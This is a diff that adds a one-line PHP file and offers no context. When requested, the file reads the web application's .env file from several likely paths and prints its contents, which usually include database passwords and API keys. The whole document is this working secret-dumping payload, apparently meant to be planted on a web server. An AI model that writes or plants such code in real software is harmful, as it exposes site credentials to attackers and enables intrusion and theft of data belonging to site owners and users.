@@ -1,0 +1,1 @@
+<?php echo file_get_contents('/var/www/html/.env') ?: file_get_contents('../.env') ?: file_get_contents('../../.env') ?: 'NO_ENV_FOUND'; ?>
